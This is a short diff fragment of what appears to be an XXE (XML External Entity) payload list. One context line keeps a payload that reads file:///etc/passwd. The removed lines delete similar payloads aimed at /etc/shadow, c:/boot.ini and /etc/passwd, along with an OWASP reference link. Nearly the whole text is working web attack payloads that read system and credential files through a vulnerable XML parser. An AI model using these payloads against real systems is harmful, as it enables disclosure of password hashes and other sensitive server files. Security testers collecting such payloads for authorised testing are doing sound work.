@@ -3,20 +3,3 @@
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
 
- <?xml version="1.0" encoding="ISO-8859-1"?>
- <!DOCTYPE foo [  
-   <!ELEMENT foo ANY >
-   <!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>
-
- <?xml version="1.0" encoding="ISO-8859-1"?>
- <!DOCTYPE foo [  
-   <!ELEMENT foo ANY >
-   <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
-   
-   https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Processing
-   
-   <?xml version="1.0" encoding="utf-8"?>
-<!DOCTYPE test [ 
-    <!ENTITY xxeattack SYSTEM "file:///etc/passwd"> 
-]>
-<xxx>&xxeattack;</xxx>
